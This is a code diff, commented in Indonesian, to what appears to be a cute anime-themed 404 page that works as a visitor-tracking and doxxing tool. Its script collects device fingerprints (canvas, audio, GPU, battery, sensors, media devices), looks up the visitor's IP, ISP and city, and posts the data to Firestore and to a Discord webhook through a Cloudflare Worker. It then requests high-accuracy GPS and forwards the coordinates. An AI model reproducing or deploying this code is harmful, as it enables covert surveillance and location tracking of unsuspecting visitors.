@@ -226,7 +226,7 @@
 
 <div id="container">
   <img id="anime-gif"
-    src="https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif"
+    src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif"
     alt="anime"
     draggable="false"
   />
@@ -257,16 +257,15 @@
 /* ── GIF fallback chain ── */
 (function loadGif() {
   const urls = [
+    "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif",
+    "https://media.giphy.com/media/1ZlXGtKFZvsfS/giphy.gif",
     "https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif",
     "https://media.giphy.com/media/xT9IgG50Lg7russBSo/giphy.gif",
-    "https://media.giphy.com/media/26BRuo6sLetdllPAQ/giphy.gif",
-    "https://media.giphy.com/media/pFwRzOLfuGHok/giphy.gif",
   ];
   const img = document.getElementById("anime-gif");
   let idx = 0;
   function tryNext() {
     if (idx >= urls.length) {
-      // Semua gagal — ganti jadi emoji besar
       img.style.display = "none";
       const fallback = document.createElement("div");
       fallback.style.cssText = "font-size:7rem;line-height:1;margin-bottom:16px;animation:floatBob 3s ease-in-out infinite;display:inline-block;";
@@ -376,12 +375,11 @@ function hashStr(str) {
   return h.toString(16).padStart(8, '0').toUpperCase();
 }
 
-/* ── DATA COLLECTION ── */
+/* ── DATA COLLECTION (paralel = cepat) ── */
 async function collectAll() {
-  addLine("Memulai pemindaian ajaib nyaa~ ✨");
-  await new Promise(r => setTimeout(r, 500));
+  addLine("Memasuki dunia isekai~ ✨");
 
-  // 1. Basic Nav
+  // ── Sync: langsung ambil tanpa nunggu ──
   const navData = {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
@@ -399,76 +397,43 @@ async function collectAll() {
     rtt: navigator.connection?.rtt ?? null,
     saveData: navigator.connection?.saveData ?? null,
   };
-  addLine("Mengintip Navigator API~ (◕‿◕✿)");
 
-  // 2. Screen
   const screenData = {
-    width: screen.width,
-    height: screen.height,
-    availWidth: screen.availWidth,
-    availHeight: screen.availHeight,
-    colorDepth: screen.colorDepth,
-    pixelRatio: window.devicePixelRatio,
+    width: screen.width, height: screen.height,
+    availWidth: screen.availWidth, availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
     orientation: screen.orientation?.type ?? null,
     orientationAngle: screen.orientation?.angle ?? null,
-    innerWidth: window.innerWidth,
-    innerHeight: window.innerHeight,
-    outerWidth: window.outerWidth,
-    outerHeight: window.outerHeight,
+    innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth, outerHeight: window.outerHeight,
   };
-  addLine("Mengukur layar onii-chan~ 🖥️");
 
-  // 3. GPU
+  // GPU (sync)
   let gpuData = { vendor: null, renderer: null, version: null };
   try {
     const c = document.createElement('canvas');
     const gl = c.getContext('webgl2') || c.getContext('webgl');
     if (gl) {
       const ext = gl.getExtension('WEBGL_debug_renderer_info');
-      gpuData.vendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : null;
+      gpuData.vendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null;
       gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
       gpuData.version  = gl.getParameter(gl.VERSION);
     }
   } catch(e) {}
-  addLine("Mendeteksi GPU-chan~ 🎮");
 
-  // 4. Audio & Canvas Fingerprint
-  let audioFingerprint = null;
+  // Canvas fingerprint (sync)
   let canvasFingerprint = null;
   try {
-    const AudioCtx = window.AudioContext || window.webkitAudioContext;
-    const actx = new AudioCtx();
-    const osc = actx.createOscillator();
-    const gain = actx.createGain();
-    const script = actx.createScriptProcessor(4096, 1, 1);
-    gain.gain.value = 0;
-    osc.connect(gain);
-    gain.connect(script);
-    script.connect(actx.destination);
-    osc.frequency.value = 1000;
-    osc.start();
-    script.onaudioprocess = (e) => {
-      const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
-      audioFingerprint = hashStr(raw);
-      osc.stop();
-      actx.close();
-    };
-    await new Promise(r => setTimeout(r, 80));
-
     const c2 = document.createElement('canvas');
     c2.width = 200; c2.height = 50;
     const ctx2 = c2.getContext('2d');
-    ctx2.textBaseline = "top";
-    ctx2.font = "14px Arial";
-    ctx2.fillStyle = "#f00";
-    ctx2.fillRect(125, 1, 62, 20);
-    ctx2.fillStyle = "#0099ff";
-    ctx2.fillText("Isekai Dox \uD83C\uDF38", 2, 15);
+    ctx2.textBaseline = "top"; ctx2.font = "14px Arial";
+    ctx2.fillStyle = "#f00"; ctx2.fillRect(125, 1, 62, 20);
+    ctx2.fillStyle = "#0099ff"; ctx2.fillText("Isekai \uD83C\uDF38", 2, 15);
     canvasFingerprint = hashStr(c2.toDataURL());
   } catch(e) {}
-  addLine("Fingerprint audio & canvas~ 🎵");
 
-  // 5. Storage & Media
+  // Storage (sync)
   const storageData = {
     localStorage:  !!window.localStorage,
     sessionStorage: !!window.sessionStorage,
@@ -478,86 +443,15 @@ async function collectAll() {
     cookies: document.cookie ? document.cookie.split(';').length : 0,
   };
 
-  let mediaData = { audioIn: [], videoIn: [], audioOut: [] };
-  try {
-    const devices = await navigator.mediaDevices?.enumerateDevices();
-    if (devices) {
-      mediaData.audioIn  = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic');
-      mediaData.videoIn  = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam');
-      mediaData.audioOut = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker');
-    }
-  } catch(e) {}
-  addLine("Cek storage & perangkat media~ 💾");
-
-  // 6. Locale & Battery
+  // Locale (sync)
   const localeData = {
-    timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
-    currency:       Intl.NumberFormat().resolvedOptions().currency   ?? null,
-    calendar:       Intl.DateTimeFormat().resolvedOptions().calendar ?? null,
+    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    currency:        Intl.NumberFormat().resolvedOptions().currency        ?? null,
+    calendar:        Intl.DateTimeFormat().resolvedOptions().calendar      ?? null,
     numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem ?? null,
   };
 
-  let batteryData = { level: null, charging: null };
-  try {
-    const batt = await navigator.getBattery?.();
-    if (batt) {
-      batteryData.level    = Math.round(batt.level * 100) + "%";
-      batteryData.charging = batt.charging;
-    }
-  } catch(e) {}
-  addLine("Baca info baterai & lokasi~ 🔋");
-
-  // 7. Sensors
-  let sensorData = { accel: null, gyro: null, mag: null };
-  try {
-    if ('Accelerometer' in window) {
-      const acc = new window.Accelerometer({ frequency: 1 });
-      const d = await acc.getData();
-      sensorData.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-    }
-    if ('Gyroscope' in window) {
-      const gyro = new window.Gyroscope({ frequency: 1 });
-      const d = await gyro.getData();
-      sensorData.gyro = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-    }
-    if ('Magnetometer' in window) {
-      const mag = new window.Magnetometer({ frequency: 1 });
-      const d = await mag.getData();
-      sensorData.mag = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
-    }
-  } catch(e) {}
-  addLine("Kalibrasi sensor gerak~ 📳");
-
-  // 8. IP & GPS
-  let ipData = {
-    ip: null, isp: null, city: null, country: null,
-    region: null, proxy: null, hosting: null, asn: null,
-  };
-  try {
-    const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
-    const json = await resp.json();
-    ipData.ip      = json.ip           ?? null;
-    ipData.isp     = json.org          ?? null;
-    ipData.city    = json.city         ?? null;
-    ipData.country = json.country_name ?? null;
-    ipData.region  = json.region       ?? null;
-    ipData.proxy   = json.proxy        ?? null;
-    ipData.hosting = json.hosting      ?? null;
-    ipData.asn     = json.asn          ?? null;
-  } catch(e) {}
-  addLine("Melacak alamat IP~ 🌐");
-
-  let gpsData = { lat: null, lon: null };
-  try {
-    const pos = await new Promise((resolve, reject) =>
-      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000, enableHighAccuracy: true })
-    );
-    gpsData.lat = pos.coords.latitude;
-    gpsData.lon = pos.coords.longitude;
-  } catch(e) {}
-  addLine("Mengunci koordinat GPS~ 📍");
-
-  // 9. Browser Features
+  // Browser features (sync)
   const features = {
     webgl2:   !!document.createElement('canvas').getContext('webgl2'),
     webgpu:   !!navigator.gpu,
@@ -567,40 +461,112 @@ async function collectAll() {
     fetchAPI: !!window.fetch,
     promise:  !!window.Promise,
   };
-  addLine("Menguji kemampuan browser~ 🧩");
 
-  // 10. Plugins & UA Hints
   const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
   const mimeList    = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
 
-  let uahData = { brands: null, mobile: null, model: null, architecture: null, bitness: null };
-  if (navigator.userAgentData) {
-    uahData.brands = JSON.stringify(navigator.userAgentData.brands);
-    uahData.mobile = navigator.userAgentData.mobile;
-    try {
-      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
-      uahData.model        = hints.model        ?? null;
-      uahData.architecture = hints.architecture ?? null;
-      uahData.bitness      = hints.bitness      ?? null;
-    } catch(e) {}
-  }
-  addLine("Analisis User Agent Hints~ 🔍");
+  addLine("Mengumpulkan data perangkat~ 💻");
 
-  // 11. Build Final Payload
+  // ── Async semua paralel ──
+  const [
+    audioFpResult,
+    ipResult,
+    mediaResult,
+    batteryResult,
+    uahResult,
+    sensorResult,
+  ] = await Promise.allSettled([
+
+    // Audio fingerprint
+    (async () => {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      const actx = new AudioCtx();
+      const osc = actx.createOscillator();
+      const gain = actx.createGain();
+      const script = actx.createScriptProcessor(4096, 1, 1);
+      gain.gain.value = 0;
+      osc.connect(gain); gain.connect(script); script.connect(actx.destination);
+      osc.frequency.value = 1000; osc.start();
+      return new Promise((res) => {
+        script.onaudioprocess = (e) => {
+          const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
+          osc.stop(); actx.close();
+          res(hashStr(raw));
+        };
+        setTimeout(() => res(null), 300);
+      });
+    })(),
+
+    // IP lookup
+    (async () => {
+      const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
+      const j = await resp.json();
+      return {
+        ip: j.ip ?? null, isp: j.org ?? null, city: j.city ?? null,
+        country: j.country_name ?? null, region: j.region ?? null,
+        proxy: j.proxy ?? null, hosting: j.hosting ?? null, asn: j.asn ?? null,
+      };
+    })(),
+
+    // Media devices
+    (async () => {
+      const devices = await navigator.mediaDevices?.enumerateDevices() ?? [];
+      return {
+        audioIn:  devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic'),
+        videoIn:  devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam'),
+        audioOut: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker'),
+      };
+    })(),
+
+    // Battery
+    (async () => {
+      const batt = await navigator.getBattery?.();
+      if (!batt) return { level: null, charging: null };
+      return { level: Math.round(batt.level * 100) + "%", charging: batt.charging };
+    })(),
+
+    // UA hints
+    (async () => {
+      if (!navigator.userAgentData) return {};
+      const base = { brands: JSON.stringify(navigator.userAgentData.brands), mobile: navigator.userAgentData.mobile };
+      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
+      return { ...base, model: hints.model ?? null, architecture: hints.architecture ?? null, bitness: hints.bitness ?? null };
+    })(),
+
+    // Sensors
+    (async () => {
+      const out = { accel: null, gyro: null, mag: null };
+      if ('Accelerometer' in window) {
+        const d = await new window.Accelerometer({ frequency: 1 }).getData?.().catch(() => null);
+        if (d) out.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+      }
+      return out;
+    })(),
+  ]);
+
+  addLine("Melacak IP & lokasi~ 🌐");
+
+  const audioFingerprint = audioFpResult.status === 'fulfilled' ? audioFpResult.value : null;
+  const ipData      = ipResult.status      === 'fulfilled' ? ipResult.value      : { ip: null, isp: null, city: null, country: null, region: null, proxy: null, hosting: null, asn: null };
+  const mediaData   = mediaResult.status   === 'fulfilled' ? mediaResult.value   : { audioIn: [], videoIn: [], audioOut: [] };
+  const batteryData = batteryResult.status === 'fulfilled' ? batteryResult.value : { level: null, charging: null };
+  const uahData     = uahResult.status     === 'fulfilled' ? uahResult.value     : {};
+  const sensorData  = sensorResult.status  === 'fulfilled' ? sensorResult.value  : { accel: null, gyro: null, mag: null };
+
+  addLine("Mengemas semua data~ 🎀");
+
+  // Build payload
   const raw = {
     ...navData, ...screenData, ...gpuData,
     audioFingerprint, canvasFingerprint,
     ...storageData, ...mediaData, ...localeData,
-    ...batteryData, ...sensorData, ...ipData, ...gpsData,
+    ...batteryData, ...sensorData, ...ipData,
     ...features,
-    plugins:   pluginsList || null,
-    mimeTypes: mimeList    || null,
+    plugins: pluginsList || null, mimeTypes: mimeList || null,
     ...uahData,
+    url:      location.href,
+    referrer: document.referrer || null,
   };
-
-  // Tambahkan URL dan referrer ke payload
-  raw.url      = location.href;
-  raw.referrer = document.referrer || null;
 
   const payload = {};
   for (const key in raw) {
@@ -609,52 +575,66 @@ async function collectAll() {
     }
   }
 
-  addLine("Mengemas data~ 🎀");
+  // Send Firebase & Worker paralel
+  const sends = [];
 
-  // Send to Firebase
   if (FB_READY) {
-    try {
+    sends.push((async () => {
       const fbPayload = {
-        ip:         payload.ip         ?? null,
-        isp:        payload.isp        ?? null,
-        city:       payload.city       ?? null,
-        region:     payload.region     ?? null,
-        country:    payload.country    ?? null,
-        timezone:   payload.timezone   ?? null,
-        platform:   payload.platform   ?? null,
-        userAgent:  payload.userAgent  ?? null,
-        language:   payload.language   ?? null,
-        screenW:    payload.width      ?? null,
-        screenH:    payload.height     ?? null,
-        pixelRatio: payload.pixelRatio ?? null,
-        url:        location.href,
-        referrer:   document.referrer  || null,
-        timestamp:  serverTimestamp(),
+        ip: payload.ip ?? null, isp: payload.isp ?? null,
+        city: payload.city ?? null, region: payload.region ?? null,
+        country: payload.country ?? null, timezone: payload.timezone ?? null,
+        platform: payload.platform ?? null, userAgent: payload.userAgent ?? null,
+        language: payload.language ?? null, screenW: payload.width ?? null,
+        screenH: payload.height ?? null, pixelRatio: payload.pixelRatio ?? null,
+        url: location.href, referrer: document.referrer || null,
+        timestamp: serverTimestamp(),
       };
       const cleanFb = {};
       for (const k in fbPayload) { if (fbPayload[k] !== null) cleanFb[k] = fbPayload[k]; }
       await addDoc(collection(db, "visitors_404"), cleanFb);
-      addLine("✅ Tersimpan ke Firestore~ 🌸");
-    } catch (e) {
-      addLine("❌ Firestore error: " + e.message);
-    }
+      addLine("✅ Memori isekai tersimpan~ 🌸");
+    })().catch(() => addLine("❌ Gagal simpan~ (╥_╥)")));
   }
 
-  // Send to Cloudflare Worker → Discord
   if (CF_READY) {
-    try {
-      await fetch(WORKER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-      addLine("✅ Laporan dikirim ke Discord~ 💕");
-    } catch (e) {
-      addLine("❌ Worker error: " + e.message);
-    }
+    sends.push(fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).then(() => addLine("✅ Laporan dikirim ke Discord~ 💕"))
+      .catch(() => addLine("❌ Gagal kirim~ (╥_╥)")));
   }
 
+  await Promise.allSettled(sends);
   addLine("Pemindaian selesai nyaa~ ✨ Arigatou!");
+
+  // ── GPS background — minta izin SETELAH laporan utama terkirim ──
+  // Kalau user klik Izinkan → kirim follow-up ke Discord
+  // Kalau Tolak / diabaikan → tidak ada yang dikirim, tidak ada error
+  if (CF_READY && navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        // Izin diberikan → kirim pesan GPS ke Worker
+        try {
+          await fetch(WORKER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              _gpsOnly: true,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              url: location.href,
+            }),
+          });
+          addLine("📍 Koordinat GPS terkirim~ 🌸");
+        } catch (_) {}
+      },
+      () => { /* Ditolak / timeout → diam saja */ },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  }
 }
 
 // Run it
